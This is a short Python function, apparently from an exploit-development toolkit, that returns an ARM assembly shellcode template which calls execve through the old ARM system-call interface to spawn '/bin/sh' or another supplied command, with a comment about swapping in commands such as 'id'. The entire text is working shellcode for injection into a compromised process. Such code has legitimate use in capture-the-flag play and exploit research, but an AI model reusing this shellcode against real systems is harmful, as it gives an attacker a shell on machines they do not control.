# /bin/sh 
def generate(cmd='/bin/sh'):
    sc = """
    adr r0, bin_sh_1
    mov r2, #0
    push {r0, r2}
    mov r1, sp
    svc (0x900000+ 11)
bin_sh_1:
    .asciz "%s"
    """ % (cmd) # sometimes we have to change to specific things like id
    return sc
